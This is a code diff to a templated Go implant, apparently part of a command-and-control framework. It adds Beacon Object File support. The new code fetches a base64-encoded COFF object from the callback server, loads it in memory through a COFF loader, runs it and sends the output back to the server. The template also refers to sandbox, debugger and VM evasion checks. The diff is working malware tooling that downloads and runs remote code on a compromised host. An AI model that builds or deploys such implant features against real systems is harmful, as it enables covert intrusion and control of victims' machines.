@@ -545,6 +545,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -560,6 +561,7 @@ import (
 	"time"{{if and .Evasion (or .Evasion.EnableSandboxDetection .Evasion.EnableDebuggerCheck .Evasion.EnableVMDetection)}}
 	"unsafe"{{end}}
 	
+	"github.com/praetorian-inc/goffloader/src/coff"
 	"golang.org/x/sys/windows"
 )
 
@@ -1097,6 +1099,173 @@ func executeMigrate(taskID, pidStr string) {
 		"Migration requires shellcode generation and process injection APIs that are not currently available in the Go implant.", pidStr))
 }
 
+// packBOFArguments packs BOF arguments according to format string
+func packBOFArguments(formatString string, args []string) ([]byte, error) {
+	if len(formatString) != len(args) {
+		return nil, fmt.Errorf("format string length (%d) must match arguments length (%d)", len(formatString), len(args))
+	}
+	
+	buffer := new(bytes.Buffer)
+	
+	for i, c := range formatString {
+		arg := args[i]
+		
+		switch c {
+		case 'b':
+			// Binary data - base64 decode
+			data, err := base64.StdEncoding.DecodeString(arg)
+			if err != nil {
+				return nil, fmt.Errorf("invalid binary data at position %d: %v", i, err)
+			}
+			if err := binary.Write(buffer, binary.LittleEndian, uint32(len(data))); err != nil {
+				return nil, err
+			}
+			buffer.Write(data)
+		case 'i':
+			// 4-byte signed integer
+			var val int32
+			if _, err := fmt.Sscanf(arg, "%d", &val); err != nil {
+				return nil, fmt.Errorf("invalid integer at position %d: %v", i, err)
+			}
+			binary.Write(buffer, binary.LittleEndian, val)
+		case 's':
+			// 2-byte signed short
+			var val int16
+			if _, err := fmt.Sscanf(arg, "%d", &val); err != nil {
+				return nil, fmt.Errorf("invalid short at position %d: %v", i, err)
+			}
+			binary.Write(buffer, binary.LittleEndian, val)
+		case 'z':
+			// UTF-8 string
+			strBytes := append([]byte(arg), 0x00)
+			binary.Write(buffer, binary.LittleEndian, uint32(len(strBytes)))
+			buffer.Write(strBytes)
+		case 'Z':
+			// UTF-16LE string
+			utf16Data := []byte{}
+			for _, r := range arg {
+				utf16Data = append(utf16Data, byte(r), byte(r>>8))
+			}
+			utf16Data = append(utf16Data, 0x00, 0x00)
+			binary.Write(buffer, binary.LittleEndian, uint32(len(utf16Data)))
+			buffer.Write(utf16Data)
+		default:
+			return nil, fmt.Errorf("invalid format character '%c' at position %d", c, i)
+		}
+	}
+	
+	// Prepend buffer length
+	finalBuffer := new(bytes.Buffer)
+	binary.Write(finalBuffer, binary.LittleEndian, uint32(buffer.Len()))
+	finalBuffer.Write(buffer.Bytes())
+	
+	return finalBuffer.Bytes(), nil
+}
+
+// executeBOF loads and executes a BOF using COFF loader
+func executeBOF(bofData []byte, args []byte, entryPoint string) (string, error) {
+	output, err := coff.Load(bofData, args)
+	if err != nil {
+		return "", fmt.Errorf("COFF loader error: %w", err)
+	}
+	return output, nil
+}
+
+func executeBOFModule(taskID, moduleID string, task map[string]interface{}, params map[string]string) {
+	{{if .Debug}}
+	debugLog("Executing BOF module: id=%s, module=%s", taskID, moduleID)
+	{{end}}
+	
+	// Request BOF file and metadata from server
+	client := &http.Client{Timeout: 30 * time.Second}
+	moduleURL := callbackURL + "/module/" + moduleID
+	if taskID != "" {
+		moduleURL += "?task_id=" + taskID
+	}
+	req, err := http.NewRequest("GET", moduleURL, nil)
+	if err != nil {
+		sendResult("module", taskID, fmt.Sprintf("Error creating BOF module request: %v", err))
+		return
+	}
+	
+	sessionMu.Lock()
+	if sessionID != "" {
+		req.Header.Set("X-Session-ID", sessionID)
+	}
+	sessionMu.Unlock()
+	req.Header.Set("User-Agent", userAgent)
+	req.Header.Set("Accept", "application/json")
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		sendResult("module", taskID, fmt.Sprintf("Error fetching BOF module: %v", err))
+		return
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != 200 {
+		body, _ := io.ReadAll(resp.Body)
+		sendResult("module", taskID, fmt.Sprintf("BOF module fetch failed (status %d): %s", resp.StatusCode, string(body)))
+		return
+	}
+	
+	var moduleResponse map[string]interface{}
+	if err := json.NewDecoder(resp.Body).Decode(&moduleResponse); err != nil {
+		sendResult("module", taskID, fmt.Sprintf("Error decoding BOF module response: %v", err))
+		return
+	}
+	
+	// Extract BOF data and metadata
+	bofDataBase64, ok := moduleResponse["bof_data"].(string)
+	if !ok {
+		sendResult("module", taskID, "BOF module response missing bof_data")
+		return
+	}
+	
+	bofData, err := base64.StdEncoding.DecodeString(bofDataBase64)
+	if err != nil {
+		sendResult("module", taskID, fmt.Sprintf("Error decoding BOF data: %v", err))
+		return
+	}
+	
+	formatString, _ := moduleResponse["format_string"].(string)
+	entryPoint, _ := moduleResponse["entry_point"].(string)
+	if entryPoint == "" {
+		entryPoint = "go" // Default entry point
+	}
+	
+	// Pack arguments according to format string
+	var argsBytes []byte
+	if formatString != "" && len(params) > 0 {
+		// Extract argument values in order
+		var argValues []string
+		for _, opt := range []string{"Architecture", "Filepath"} {
+			if val, ok := params[opt]; ok {
+				argValues = append(argValues, val)
+			}
+		}
+		// Pack arguments
+		argsBytes, err = packBOFArguments(formatString, argValues)
+		if err != nil {
+			sendResult("module", taskID, fmt.Sprintf("Error packing BOF arguments: %v", err))
+			return
+		}
+	}
+	
+	{{if .Debug}}
+	debugLog("Loading BOF: entry_point=%s, format_string=%s, args_len=%d", entryPoint, formatString, len(argsBytes))
+	{{end}}
+	
+	// Execute BOF using COFF loader
+	output, err := executeBOF(bofData, argsBytes, entryPoint)
+	if err != nil {
+		sendResult("module", taskID, fmt.Sprintf("Error executing BOF: %v", err))
+		return
+	}
+	
+	sendResult("module", taskID, output)
+}
+
 func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	{{if .Debug}}
 	debugLog("Executing module: id=%s, module=%s", taskID, moduleID)
@@ -1115,6 +1284,12 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		}
 	} else {
 		params = make(map[string]string)
+	}
+	
+	// Check if this is a BOF module
+	if strings.Contains(moduleID, "bof/") || strings.HasSuffix(moduleID, ".o") {
+		executeBOFModule(taskID, moduleID, task, params)
+		return
 	}
 	
 	// For PowerShell and Python modules, execute via their respective interpreters dynamically
@@ -1327,8 +1502,6 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	var errorMsg string
 	if strings.Contains(moduleID, "csharp/") {
 		errorMsg = "Error: C# modules are not supported by Go implants. Only PowerShell and Python modules are currently supported."
-	} else if strings.Contains(moduleID, "bof/") || strings.HasSuffix(moduleID, ".o") {
-		errorMsg = "Error: BOF (Beacon Object File) modules are not supported by Go implants. BOFs require a COFF loader extension and are typically executed via Cobalt Strike or Sliver. Only PowerShell and Python modules are currently supported."
 	} else {
 		errorMsg = fmt.Sprintf("Error: Module type not supported (not PowerShell/Python and not embedded). Module: %s", moduleID)
 	}
